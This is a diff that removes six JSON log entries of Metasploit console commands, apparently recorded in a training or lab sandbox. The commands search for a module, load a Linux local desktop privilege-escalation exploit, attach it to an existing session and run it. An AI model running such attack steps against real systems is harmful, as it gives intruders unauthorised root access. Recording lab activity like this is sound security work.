@@ -1,6 +1,0 @@
-{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:18:45.605998Z", "cmd_type": "msf-command", "cmd": "search 16995"}
-{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:19:36.063825Z", "cmd_type": "msf-command", "cmd": "use exploit/linux/local/desktop_privilege_escalation "}
-{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:19:39.379931Z", "cmd_type": "msf-command", "cmd": "options"}
-{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:19:50.576323Z", "cmd_type": "msf-command", "cmd": "sessions"}
-{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:19:58.911185Z", "cmd_type": "msf-command", "cmd": "set SESSION 1"}
-{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:20:08.823180Z", "cmd_type": "msf-command", "cmd": "exploit "}
